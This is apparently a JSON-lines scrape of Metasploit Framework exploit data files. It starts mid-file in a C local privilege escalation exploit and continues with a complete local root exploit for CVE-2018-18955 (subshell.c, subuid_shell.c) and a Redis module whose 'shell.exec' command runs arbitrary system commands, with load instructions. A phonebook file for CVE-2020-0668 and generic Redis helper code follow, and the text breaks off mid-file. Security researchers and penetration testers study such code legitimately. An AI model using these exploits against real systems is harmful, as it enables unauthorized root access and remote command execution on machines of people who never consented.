setresgid(0, 0, 0);\n    setresuid(0, 0, 0);\n    invokeShell(NULL);\n    return(1);\n  }\n\n  for(int argPos=1; argPos<argc;) {\n    char *argName=argv[argPos++];\n    if(argPos==argc) {\n      fprintf(stderr, \"%s requires parameter\\n\", argName);\n      return(1);\n    }\n    if(!strcmp(\"--Pid\", argName)) {\n      char *endPtr;\n      namespacedProcessPid=strtoll(argv[argPos++], &endPtr, 10);\n      if((errno)||(*endPtr)) {\n        fprintf(stderr, \"Invalid pid value\\n\");\n        return(1);\n      }\n      killNamespacedProcessFlag=0;\n    } else {\n      fprintf(stderr, \"Unknown argument %s\\n\", argName);\n      return(1);\n    }\n  }\n\n  fprintf(stderr, \"%s: setting up environment ...\\n\", programmName);\n\n  if(!osRelease) {\n    if(detectOsRelease()) {\n      fprintf(stderr, \"Failed to detect OS version, continuing anyway\\n\");\n    }\n  }\n\n  umountPathname=findUmountBinaryPathname(\"/bin\");\n  if((!umountPathname)&&(getenv(\"PATH\")))\n    umountPathname=findUmountBinaryPathname(getenv(\"PATH\"));\n  if(!umountPathname) {\n    fprintf(stderr, \"Failed to locate \\\"umount\\\" binary, is PATH correct?\\n\");\n    goto preReturnCleanup;\n  }\n  fprintf(stderr, \"%s: using umount at \\\"%s\\\".\\n\", programmName,\n      umountPathname);\n\n  pid_t nsPid=prepareNamespacedProcess();\n  if(nsPid<0) {\n    goto preReturnCleanup;\n  }\n\n// Gaining root can still fail due to ASLR creating additional\n// path separators in memory addresses residing in area to be\n// overwritten by buffer underflow. Retry regaining until this\n// executable changes uid/gid.\n  int escalateMaxAttempts=10;\n  int excalateCurrentAttempt=0;\n  while(excalateCurrentAttempt<escalateMaxAttempts) {\n    excalateCurrentAttempt++;\n    fprintf(stderr, \"Attempting to gain root, try %d of %d ...\\n\",\n        excalateCurrentAttempt, escalateMaxAttempts);\n\n    attemptEscalation();\n\n    struct stat statBuf;\n    int statResult=stat(\"/proc/self/exe\", &statBuf);\n       int stat(const char *pathname, struct stat *buf);\n    if(statResult) {\n      fprintf(stderr, \"Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\\n\");\n      break;\n    }\n    if(statBuf.st_uid==0) {\n      fprintf(stderr, \"Executable now root-owned\\n\");\n      goto escalateOk;\n    }\n  }\n\n  fprintf(stderr, \"Escalation FAILED, maybe target system not (yet) supported by exploit!\\n\");\n\npreReturnCleanup:\n  if(namespacedProcessPid>0) {\n    if(killNamespacedProcessFlag) {\n      kill(namespacedProcessPid, SIGKILL);\n    } else {\n// We used an existing namespace or chroot to escalate. Remove\n// the files created there.\n      fprintf(stderr, \"No namespace cleanup for preexisting namespaces yet, do it manually.\\n\");\n    }\n  }\n\n  if(!exitStatus) {\n    fprintf(stderr, \"Cleanup completed, re-invoking binary\\n\");\n    invokeShell(\"/proc/self/exe\");\n    exitStatus=1;\n  }\n  return(exitStatus);\n\nescalateOk:\n  exitStatus=0;\n  goto preReturnCleanup;\n}\n", "timestamp": "2025-10-24T23:42:04.055425"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2018-18955/subshell.c", "content": "// subshell.c\n// author: Jann Horn\n// source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712\n\n#define _GNU_SOURCE\n#include <unistd.h>\n#include <grp.h>\n#include <err.h>\n#include <stdio.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <sys/un.h>\n#include <sched.h>\n#include <sys/wait.h>\n\nint main() {\n  int sync_pipe[2];\n  char dummy;\n  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe)) err(1, \"pipe\");\n\n  pid_t child = fork();\n  if (child == -1) err(1, \"fork\");\n  if (child == 0) {\n    close(sync_pipe[1]);\n    if (unshare(CLONE_NEWUSER)) err(1, \"unshare userns\");\n    if (write(sync_pipe[0], \"X\", 1) != 1) err(1, \"write to sock\");\n\n    if (read(sync_pipe[0], &dummy, 1) != 1) err(1, \"read from sock\");\n    execl(\"/bin/bash\", \"bash\", NULL);\n    err(1, \"exec\");\n  }\n\n  close(sync_pipe[0]);\n  if (read(sync_pipe[1], &dummy, 1) != 1) err(1, \"read from sock\");\n  char pbuf[100];\n  sprintf(pbuf, \"/proc/%d\", (int)child);\n  if (chdir(pbuf)) err(1, \"chdir\");\n  const char *id_mapping = \"0 0 1\\n1 1 1\\n2 2 1\\n3 3 1\\n4 4 1\\n5 5 995\\n\";\n  int uid_map = open(\"uid_map\", O_WRONLY);\n  if (uid_map == -1) err(1, \"open uid map\");\n  if (write(uid_map, id_mapping, strlen(id_mapping)) != strlen(id_mapping)) err(1, \"write uid map\");\n  close(uid_map);\n  int gid_map = open(\"gid_map\", O_WRONLY);\n  if (gid_map == -1) err(1, \"open gid map\");\n  if (write(gid_map, id_mapping, strlen(id_mapping)) != strlen(id_mapping)) err(1, \"write gid map\");\n  close(gid_map);\n  if (write(sync_pipe[1], \"X\", 1) != 1) err(1, \"write to sock\");\n\n  int status;\n  if (wait(&status) != child) err(1, \"wait\");\n  return 0;\n}\n", "timestamp": "2025-10-24T23:42:04.391664"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2018-18955/subuid_shell.c", "content": "// subuid_shell.c - Linux local root exploit for CVE-2018-18955\n// Exploits broken uid/gid mapping in nested user namespaces.\n// ---\n// Mostly stolen from Jann Horn's exploit:\n// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1712\n// Some code stolen from Xairy's exploits:\n// - https://github.com/xairy/kernel-exploits\n// ---\n// <bcoles@gmail.com>\n// - added auto subordinate id mapping\n// https://github.com/bcoles/kernel-exploits/tree/cve-2018-18955\n\n#define _GNU_SOURCE\n\n#include <unistd.h>\n#include <fcntl.h>\n#include <grp.h>\n#include <pwd.h>\n#include <sched.h>\n#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/un.h>\n#include <sys/wait.h>\n#include <stdarg.h>\n#include <stdlib.h>\n#include <string.h>\n#include <signal.h>\n#include <sys/prctl.h>\n\n#define DEBUG\n\n#ifdef DEBUG\n#  define dprintf printf\n#else\n#  define dprintf\n#endif\n\nchar* SUBSHELL = \"./subshell\";\n\n\n// * * * * * * * * * * * * * * * * * File I/O * * * * * * * * * * * * * * * * *\n\n#define CHUNK_SIZE 1024\n\nint read_file(const char* file, char* buffer, int max_length) {\n  int f = open(file, O_RDONLY);\n  if (f == -1)\n    return -1;\n  int bytes_read = 0;\n  while (1) {\n    int bytes_to_read = CHUNK_SIZE;\n    if (bytes_to_read > max_length - bytes_read)\n      bytes_to_read = max_length - bytes_read;\n    int rv = read(f, &buffer[bytes_read], bytes_to_read);\n    if (rv == -1)\n      return -1;\n    bytes_read += rv;\n    if (rv == 0)\n      return bytes_read;\n  }\n}\n\nstatic int write_file(const char* file, const char* what, ...) {\n  char buf[1024];\n  va_list args;\n  va_start(args, what);\n  vsnprintf(buf, sizeof(buf), what, args);\n  va_end(args);\n  buf[sizeof(buf) - 1] = 0;\n  int len = strlen(buf);\n\n  int fd = open(file, O_WRONLY | O_CLOEXEC);\n  if (fd == -1)\n    return -1;\n  if (write(fd, buf, len) != len) {\n    close(fd);\n    return -1;\n  }\n  close(fd);\n  return 0;\n}\n\n\n// * * * * * * * * * * * * * * * * * Map * * * * * * * * * * * * * * * * *\n\nint get_subuid(char* output, int max_length) {\n  char buffer[1024];\n  char* path = \"/etc/subuid\";\n  int length = read_file(path, &buffer[0], sizeof(buffer));\n  if (length == -1)\n    return -1;\n\n  int real_uid = getuid();\n  struct passwd *u = getpwuid(real_uid);\n\n  char needle[1024];\n  sprintf(needle, \"%s:\", u->pw_name);\n  int needle_length = strlen(needle);\n  char* found = memmem(&buffer[0], length, needle, needle_length);\n  if (found == NULL)\n    return -1;\n\n  int i;\n  for (i = 0; found[needle_length + i] != ':'; i++) {\n    if (i >= max_length)\n      return -1;\n    if ((found - &buffer[0]) + needle_length + i >= length)\n      return -1;\n    output[i] = found[needle_length + i];\n  }\n\n  return 0;\n}\n\nint get_subgid(char* output, int max_length) {\n  char buffer[1024];\n  char* path = \"/etc/subgid\";\n  int length = read_file(path, &buffer[0], sizeof(buffer));\n  if (length == -1)\n    return -1;\n\n  int real_gid = getgid();\n  struct group *g = getgrgid(real_gid);\n\n  char needle[1024];\n  sprintf(needle, \"%s:\", g->gr_name);\n  int needle_length = strlen(needle);\n  char* found = memmem(&buffer[0], length, needle, needle_length);\n  if (found == NULL)\n    return -1;\n\n  int i;\n  for (i = 0; found[needle_length + i] != ':'; i++) {\n    if (i >= max_length)\n      return -1;\n    if ((found - &buffer[0]) + needle_length + i >= length)\n      return -1;\n    output[i] = found[needle_length + i];\n  }\n\n  return 0;\n}\n\n\n// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * *\n\nint main(int argc, char** argv) {\n  if (argc > 1) SUBSHELL = argv[1];\n\n  dprintf(\"[.] starting\\n\");\n\n  dprintf(\"[.] setting up namespace\\n\");\n\n  int sync_pipe[2];\n  char dummy;\n\n  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe)) {\n    dprintf(\"[-] pipe\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  pid_t child = fork();\n\n  if (child == -1) {\n    dprintf(\"[-] fork\");\n    exit(EXIT_FAILURE);\n  }\n\n  if (child == 0) {\n    prctl(PR_SET_PDEATHSIG, SIGKILL);\n    close(sync_pipe[1]);\n\n    if (unshare(CLONE_NEWUSER) != 0) {\n      dprintf(\"[-] unshare(CLONE_NEWUSER)\\n\");\n      exit(EXIT_FAILURE);\n    }\n\n    if (unshare(CLONE_NEWNET) != 0) {\n      dprintf(\"[-] unshare(CLONE_NEWNET)\\n\");\n      exit(EXIT_FAILURE);\n    }\n\n    if (write(sync_pipe[0], \"X\", 1) != 1) {\n      dprintf(\"write to sock\\n\");\n      exit(EXIT_FAILURE);\n    }\n\n    if (read(sync_pipe[0], &dummy, 1) != 1) {\n      dprintf(\"[-] read from sock\\n\");\n      exit(EXIT_FAILURE);\n    }\n\n    if (setgid(0)) {\n      dprintf(\"[-] setgid\");\n      exit(EXIT_FAILURE);\n    }\n\n    if (setuid(0)) {\n      printf(\"[-] setuid\");\n      exit(EXIT_FAILURE);\n    }\n\n    execl(SUBSHELL, \"\", NULL);\n\n    dprintf(\"[-] executing subshell failed\\n\");\n  }\n\n  close(sync_pipe[0]);\n\n  if (read(sync_pipe[1], &dummy, 1) != 1) {\n    dprintf(\"[-] read from sock\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  char path[256];\n  sprintf(path, \"/proc/%d/setgroups\", (int)child);\n\n  if (write_file(path, \"deny\") == -1) {\n    dprintf(\"[-] denying setgroups failed\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  dprintf(\"[~] done, namespace sandbox set up\\n\");\n\n  dprintf(\"[.] mapping subordinate ids\\n\");\n  char subuid[64];\n  char subgid[64];\n\n  if (get_subuid(&subuid[0], sizeof(subuid))) {\n    dprintf(\"[-] couldn't find subuid map in /etc/subuid\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  if (get_subgid(&subgid[0], sizeof(subgid))) {\n    dprintf(\"[-] couldn't find subgid map in /etc/subgid\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  dprintf(\"[.] subuid: %s\\n\", subuid);\n  dprintf(\"[.] subgid: %s\\n\", subgid);\n\n  char cmd[256];\n\n  sprintf(cmd, \"newuidmap %d 0 %s 1000\", (int)child, subuid);\n  if (system(cmd))  {\n    dprintf(\"[-] newuidmap failed\");\n    exit(EXIT_FAILURE);\n  }\n\n  sprintf(cmd, \"newgidmap %d 0 %s 1000\", (int)child, subgid);\n  if (system(cmd)) {\n    dprintf(\"[-] newgidmap failed\");\n    exit(EXIT_FAILURE);\n  }\n\n  dprintf(\"[~] done, mapped subordinate ids\\n\");\n\n  dprintf(\"[.] executing subshell\\n\");\n\n  if (write(sync_pipe[1], \"X\", 1) != 1) {\n    dprintf(\"[-] write to sock\");\n    exit(EXIT_FAILURE);\n  }\n\n  int status;\n  if (wait(&status) != child) {\n    dprintf(\"[-] wait\");\n    exit(EXIT_FAILURE);\n  }\n\n  return 0;\n}\n", "timestamp": "2025-10-24T23:42:04.726391"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2020-0668/phonebook.txt", "content": "[VPNTEST]\nEncoding=1\nPBVersion=1\nType=2\nAutoLogon=1\nUseRasCredentials=1\nLowDateTime=-1345834320\nHighDateTime=30248544\nDialParamsUID=849441\nGuid=174463CE6AAFD4458FC57A466A95B787\nVpnStrategy=1\nExcludedProtocols=0\nLcpExtensions=1\nDataEncryption=8\nSwCompression=0\nNegotiateMultilinkAlways=0\nSkipDoubleDialDialog=0\nDialMode=0\nOverridePref=15\nRedialAttempts=3\nRedialSeconds=60\nIdleDisconnectSeconds=0\nRedialOnLinkFailure=1\nCallbackMode=0\nCustomDialDll=\nCustomDialFunc=\nCustomRasDialDll=\nForceSecureCompartment=0\nDisableIKENameEkuCheck=0\nAuthenticateServer=0\nShareMsFilePrint=1\nBindMsNetClient=1\nSharedPhoneNumbers=0\nGlobalDeviceSettings=0\nPrerequisiteEntry=\nPrerequisitePbk=\nPreferredPort=VPN3-0\nPreferredDevice=WAN Miniport (PPTP)\nPreferredBps=0\nPreferredHwFlow=1\nPreferredProtocol=1\nPreferredCompression=1\nPreferredSpeaker=1\nPreferredMdmProtocol=0\nPreviewUserPw=1\nPreviewDomain=1\nPreviewPhoneNumber=0\nShowDialingProgress=1\nShowMonitorIconInTaskBar=1\nCustomAuthKey=0\nAuthRestrictions=544\nIpPrioritizeRemote=1\nIpInterfaceMetric=0\nIpHeaderCompression=0\nIpAddress=0.0.0.0\nIpDnsAddress=0.0.0.0\nIpDns2Address=0.0.0.0\nIpWinsAddress=0.0.0.0\nIpWins2Address=0.0.0.0\nIpAssign=1\nIpNameAssign=1\nIpDnsFlags=0\nIpNBTFlags=1\nTcpWindowSize=0\nUseFlags=2\nIpSecFlags=0\nIpDnsSuffix=\nIpv6Assign=1\nIpv6Address=::\nIpv6PrefixLength=0\nIpv6PrioritizeRemote=1\nIpv6InterfaceMetric=0\nIpv6NameAssign=1\nIpv6DnsAddress=::\nIpv6Dns2Address=::\nIpv6Prefix=0000000000000000\nIpv6InterfaceId=0000000000000000\nDisableClassBasedDefaultRoute=0\nDisableMobility=0\nNetworkOutageTime=0\nProvisionType=0\nPreSharedKey=\n\nNETCOMPONENTS=\nms_msclient=1\nms_server=1\n\nMEDIA=rastapi\nPort=VPN3-0\nDevice=WAN Miniport (PPTP)\n\nDEVICE=vpn\nPhoneNumber=127.0.0.1\nAreaCode=\nCountryCode=0\nCountryID=0\nUseDialingRules=0\nComment=\nFriendlyName=\nLastSelectedPhone=0\nPromoteAlternates=0\nTryNextAlternateOnFail=1", "timestamp": "2025-10-24T23:42:05.090209"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/exp/exp.c", "content": "#include \"redismodule.h\"\n\n#include <stdio.h> \n#include <unistd.h>  \n#include <stdlib.h> \n#include <errno.h>   \n#include <sys/wait.h>\n#include <sys/types.h> \n#include <sys/socket.h>\n#include <netinet/in.h>\n\nint Shell(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n        if (argc == 2) {\n                size_t cmd_len;\n                size_t size = 1024;\n                char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);\n\n                FILE *fp = popen(cmd, \"r\");\n                char *buf, *output;\n                buf = (char *)malloc(size);\n                output = (char *)malloc(size);\n                while ( fgets(buf, sizeof(buf), fp) != 0 ) {\n                        if (strlen(buf) + strlen(output) >= size) {\n                                output = realloc(output, size<<2);\n                                size <<= 1;\n                        }\n                        strcat(output, buf);\n                }\n                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));\n                RedisModule_ReplyWithString(ctx, ret);\n                pclose(fp);\n        } else {\n                return RedisModule_WrongArity(ctx);\n        }\n        return REDISMODULE_OK;\n}\n\nint RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n    if (RedisModule_Init(ctx,\"shell\",1,REDISMODULE_APIVER_1)\n                        == REDISMODULE_ERR) return REDISMODULE_ERR;\n\n    if (RedisModule_CreateCommand(ctx, \"shell.exec\",\n        Shell, \"readonly\", 1, 1, 1) == REDISMODULE_ERR)\n        return REDISMODULE_ERR;\n\n    return REDISMODULE_OK;\n}\n", "timestamp": "2025-10-24T23:42:05.426791"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/exp/readme.md", "content": "## Intro\n\nThis is a compiled shared object file of redis module.\n\n## Load redis extension\n\n```\nMODULE load ./exp.so\n```\n\n## Run command\n\n```\nredis-cli\n127.0.0.1:6379> shell.exec \"whoami\"\n```\n## Compile\n\nYou can modify the exp.c source code if you want.\nAnd the compile it to exp.so in current directory.\n```\nmake\n```\n", "timestamp": "2025-10-24T23:42:05.796490"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/alloc.c", "content": "#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include \"alloc.h\"\n\n/* A patched implementation of strdup that will use our patched calloc */\nchar *rmalloc_strndup(const char *s, size_t n) {\n  char *ret = calloc(n + 1, sizeof(char));\n  if (ret)\n    memcpy(ret, s, n);\n  return ret;\n}\n\n/*\n * Re-patching RedisModule_Alloc and friends to the original malloc functions\n *\n * This function should be called if you are working with malloc-patched code\n * outside of redis, usually for unit tests. Call it once when entering your unit\n * tests' main().\n *\n * Since including \"alloc.h\" while defining REDIS_MODULE_TARGET\n * replaces all malloc functions in redis with the RM_Alloc family of functions,\n * when running that code outside of redis, your app will crash. This function\n * patches the RM_Alloc functions back to the original mallocs. */\nvoid RMUTil_InitAlloc() {\n\n  RedisModule_Alloc = malloc;\n  RedisModule_Realloc = realloc;\n  RedisModule_Calloc = calloc;\n  RedisModule_Free = free;\n  RedisModule_Strdup = strdup;\n}\n", "timestamp": "2025-10-24T23:42:06.144599"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/heap.c", "content": "#include \"heap.h\"\n\n/* Byte-wise swap two items of size SIZE. */\n#define SWAP(a, b, size)                      \\\n  do                                          \\\n    {                                         \\\n      register size_t __size = (size);        \\\n      register char *__a = (a), *__b = (b);   \\\n      do                                      \\\n        {                                     \\\n          char __tmp = *__a;                  \\\n          *__a++ = *__b;                      \\\n          *__b++ = __tmp;                     \\\n        } while (--__size > 0);               \\\n    } while (0)\n\ninline char *__vector_GetPtr(Vector *v, size_t pos) {\n    return v->data + (pos * v->elemSize);\n}\n\nvoid __sift_up(Vector *v, size_t first, size_t last, int (*cmp)(void *, void *)) {\n    size_t len = last - first;\n    if (len > 1) {\n        len = (len - 2) / 2;\n        size_t ptr = first + len;\n        if (cmp(__vector_GetPtr(v, ptr), __vector_GetPtr(v, --last)) < 0) {\n            char t[v->elemSize];\n            memcpy(t, __vector_GetPtr(v, last), v->elemSize);\n            do {\n                memcpy(__vector_GetPtr(v, last), __vector_GetPtr(v, ptr), v->elemSize);\n                last = ptr;\n                if (len == 0)\n                    break;\n                len = (len - 1) / 2;\n                ptr = first + len;\n            } while (cmp(__vector_GetPtr(v, ptr), t) < 0);\n            memcpy(__vector_GetPtr(v, last), t, v->elemSize);\n        }\n    }\n}\n\nvoid __sift_down(Vector *v, size_t first, size_t last, int (*cmp)(void *, void *), size_t start) {\n    // left-child of __start is at 2 * __start + 1\n    // right-child of __start is at 2 * __start + 2\n    size_t len = last - first;\n    size_t child = start - first;\n\n    if (len < 2 || (len - 2) / 2 < child)\n        return;\n\n    child = 2 * child + 1;\n\n    if ((child + 1) < len && cmp(__vector_GetPtr(v, first + child), __vector_GetPtr(v, first + child + 1)) < 0) {\n        // right-child exists and is greater than left-child\n        ++child;\n    }\n\n    // check if we are in heap-order\n    if (cmp(__vector_GetPtr(v, first + child), __vector_GetPtr(v, start)) < 0)\n        // we are, __start is larger than it's largest child\n        return;\n\n    char top[v->elemSize];\n    memcpy(top, __vector_GetPtr(v, start), v->elemSize);\n    do {\n        // we are not in heap-order, swap the parent with it's largest child\n        memcpy(__vector_GetPtr(v, start), __vector_GetPtr(v, first + child), v->elemSize);\n        start = first + child;\n\n        if ((len - 2) / 2 < child)\n            break;\n\n        // recompute the child based off of the updated parent\n        child = 2 * child + 1;\n\n        if ((child + 1) < len && cmp(__vector_GetPtr(v, first + child), __vector_GetPtr(v, first + child + 1)) < 0) {\n            // right-child exists and is greater than left-child\n            ++child;\n        }\n\n        // check if we are in heap-order\n    } while (cmp(__vector_GetPtr(v, first + child), top) >= 0);\n    memcpy(__vector_GetPtr(v, start), top, v->elemSize);\n}\n\n\nvoid Make_Heap(Vector *v, size_t first, size_t last, int (*cmp)(void *, void *)) {\n    if (last - first > 1) {\n        // start from the first parent, there is no need to consider children\n        for (int start = (last - first - 2) / 2; start >= 0; --start) {\n            __sift_down(v, first, last, cmp, first + start);\n        }\n    }\n}\n\n\ninline void Heap_Push(Vector *v, size_t first, size_t last, int (*cmp)(void *, void *)) {\n    __sift_up(v, first, last, cmp);\n}\n\n\ninline void Heap_Pop(Vector *v, size_t first, size_t last, int (*cmp)(void *, void *)) {\n    if (last - first > 1) {\n        SWAP(__vector_GetPtr(v, first), __vector_GetPtr(v, --last), v->elemSize);\n        __sift_down(v, first, last, cmp, first);\n    }\n}\n", "timestamp": "2025-10-24T23:42:06.476550"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/periodic.c", "content": "#define REDISMODULE_EXPERIMENTAL_API\n#include \"periodic.h\"\n#include <pthread.h>\n#include <stdlib.h>\n#include <errno.h>\n\ntypedef struct RMUtilTimer {\n  RMutilTimerFunc cb;\n  RMUtilTimerTerminationFunc onTerm;\n  void *privdata;\n  struct timespec interval;\n  pthread_t thread;\n  pthread_mutex_t lock;\n  pthread_cond_t cond;\n} RMUtilTimer;\n\nstatic struct timespec timespecAdd(struct timespec *a, struct timespec *b) {\n  struct timespec ret;\n  ret.tv_sec = a->tv_sec + b->tv_sec;\n\n  long long ns = a->tv_nsec + b->tv_nsec;\n  ret.tv_sec += ns / 1000000000;\n  ret.tv_nsec = ns % 1000000000;\n  return ret;\n}\n\nstatic void *rmutilTimer_Loop(void *ctx) {\n  RMUtilTimer *tm = ctx;\n\n  int rc = ETIMEDOUT;\n  struct timespec ts;\n\n  pthread_mutex_lock(&tm->lock);\n  while (rc != 0) {\n    clock_gettime(CLOCK_REALTIME, &ts);\n    struct timespec timeout = timespecAdd(&ts, &tm->interval);\n    if ((rc = pthread_cond_timedwait(&tm->cond, &tm->lock, &timeout)) == ETIMEDOUT) {\n\n      // Create a thread safe context if we're running inside redis\n      RedisModuleCtx *rctx = NULL;\n      if (RedisModule_GetThreadSafeContext) rctx = RedisModule_GetThreadSafeContext(NULL);\n\n      // call our callback...\n      tm->cb(rctx, tm->privdata);\n\n      // If needed - free the thread safe context.\n      // It's up to the user to decide whether automemory is active there\n      if (rctx) RedisModule_FreeThreadSafeContext(rctx);\n    }\n    if (rc == EINVAL) {\n      perror(\"Error waiting for condition\");\n      break;\n    }\n  }\n\n  // call the termination callback if needed\n  if (tm->onTerm != NULL) {\n    tm->onTerm(tm->privdata);\n  }\n\n  // free resources associated with the timer\n  pthread_cond_destroy(&tm->cond);\n  free(tm);\n\n  return NULL;\n}\n\n/* set a new frequency for the timer. This will take effect AFTER the next trigger */\nvoid RMUtilTimer_SetInterval(struct RMUtilTimer *t, struct timespec newInterval) {\n  t->interval = newInterval;\n}\n\nRMUtilTimer *RMUtil_NewPeriodicTimer(RMutilTimerFunc cb, RMUtilTimerTerminationFunc onTerm,\n                                     void *privdata, struct timespec interval) {\n  RMUtilTimer *ret = malloc(sizeof(*ret));\n  *ret = (RMUtilTimer){\n      .privdata = privdata, .interval = interval, .cb = cb, .onTerm = onTerm,\n  };\n  pthread_cond_init(&ret->cond, NULL);\n  pthread_mutex_init(&ret->lock, NULL);\n\n  pthread_create(&ret->thread, NULL, rmutilTimer_Loop, ret);\n  return ret;\n}\n\nint RMUtilTimer_Terminate(struct RMUtilTimer *t) {\n  return pthread_cond_signal(&t->cond);\n}\n", "timestamp": "2025-10-24T23:42:06.794918"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/priority_queue.c", "content": "#include \"priority_queue.h\"\n#include \"heap.h\"\n\nPriorityQueue *__newPriorityQueueSize(size_t elemSize, size_t cap, int (*cmp)(void *, void *)) {\n    PriorityQueue *pq = malloc(sizeof(PriorityQueue));\n    pq->v = __newVectorSize(elemSize, cap);\n    pq->cmp = cmp;\n    return pq;\n}\n\ninline size_t Priority_Queue_Size(PriorityQueue *pq) {\n    return Vector_Size(pq->v);\n}\n\ninline int Priority_Queue_Top(PriorityQueue *pq, void *ptr) {\n    return Vector_Get(pq->v, 0, ptr);\n}\n\ninline size_t __priority_Queue_PushPtr(PriorityQueue *pq, void *elem) {\n    size_t top = __vector_PushPtr(pq->v, elem);\n    Heap_Push(pq->v, 0, top, pq->cmp);\n    return top;\n}\n\ninline void Priority_Queue_Pop(PriorityQueue *pq) {\n    if (pq->v->top == 0) {\n        return;\n    }\n    Heap_Pop(pq->v, 0, pq->v->top, pq->cmp);\n    pq->v->top--;\n}\n\nvoid Priority_Queue_Free(PriorityQueue *pq) {\n    Vector_Free(pq->v);\n    free(pq);\n}\n", "timestamp": "2025-10-24T23:42:07.144794"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/redis/rmutil/sds.c", "content": "/* SDSLib 2.0 -- A C dynamic strings library\n *\n * Copyright (c) 2006-2015, Salvatore Sanfilippo <antirez at gmail dot com>\n * Copyright (c) 2015, Oran Agra\n * Copyright (c) 2015, Redis Labs, Inc\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n *   * Redistributions of source code must retain the above copyright notice,\n *     this list of conditions and the following disclaimer.\n *   * Redistributions in binary form must reproduce the above copyright\n *     notice, this list of conditions and the following disclaimer in the\n *     documentation and/or other materials provided with the distribution.\n *   * Neither the name of Redis nor the names of its contributors may be used\n *     to endorse or promote products derived from this software without\n *     specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <ctype.h>\n#include <assert.h>\n#include \"sds.h\"\n#include \"sdsalloc.h\"\n\nstatic inline int sdsHdrSize(char type) {\n    switch(type&SDS_TYPE_MASK) {\n        case SDS_TYPE_5:\n            return sizeof(struct sdshdr5);\n        case SDS_TYPE_8:\n            return sizeof(struct sdshdr8);\n        case SDS_TYPE_16:\n            return sizeof(struct sdshdr16);\n        case SDS_TYPE_32:\n            return sizeof(struct sdshdr32);\n        case SDS_TYPE_64:\n            return sizeof(struct sdshdr64);\n    }\n    return 0;\n}\n\nstatic inline char sdsReqType(size_t string_size) {\n    if (string_size < 32)\n        return SDS_TYPE_5;\n    if (string_size < 0xff)\n        return SDS_TYPE_8;\n    if (string_size < 0xffff)\n        return SDS_TYPE_16;\n    if (string_size < 0xffffffff)\n        return SDS_TYPE_32;\n    return SDS_TYPE_64;\n}\n\n/* Create a new sds string with the content specified by the 'init' pointer\n * and 'initlen'.\n * If NULL is used for 'init' the string is initialized with zero bytes.\n *\n * The string is always null-termined (all the sds strings are, always) so\n * even if you create an sds string with:\n *\n * mystring = sdsnewlen(\"abc\",3);\n *\n * You can print the string with printf() as there is an implicit \\0 at the\n * end of the string. However the string is binary safe and can contain\n * \\0 characters in the middle, as the length is stored in the sds header. */\nsds sdsnewlen(const void *init, size_t initlen) {\n    void *sh;\n    sds s;\n    char type = sdsReqType(initlen);\n    /* Empty strings are usually created in order to append. Use type 8\n     * since type 5 is not good at this. */\n    if (type == SDS_TYPE_5 && initlen == 0) type = SDS_TYPE_8;\n    int hdrlen = sdsHdrSize(type);\n    unsigned char *fp; /* flags pointer. */\n\n    sh = s_malloc(hdrlen+initlen+1);\n    if (!init)\n        memset(sh, 0, hdrlen+initlen+1);\n    if (sh == NULL) return NULL;\n    s = (char*)sh+hdrlen;\n    fp = ((unsigned char*)s)-1;\n    switch(type) {\n        case SDS_TYPE_5: {\n            *fp = type | (initlen << SDS_TYPE_BITS);\n            break;\n        }\n        case SDS_TYPE_8: {\n            SDS_HDR_VAR(8,s);\n            sh->len = initlen;\n            sh->alloc = initlen;\n            *fp = type;\n            break;\n        }\n        case SDS_TYPE_16: {\n            SDS_HDR_VAR(16,s);\n            sh->len = initlen;\n            sh->alloc = initlen;\n            *fp = type;\n            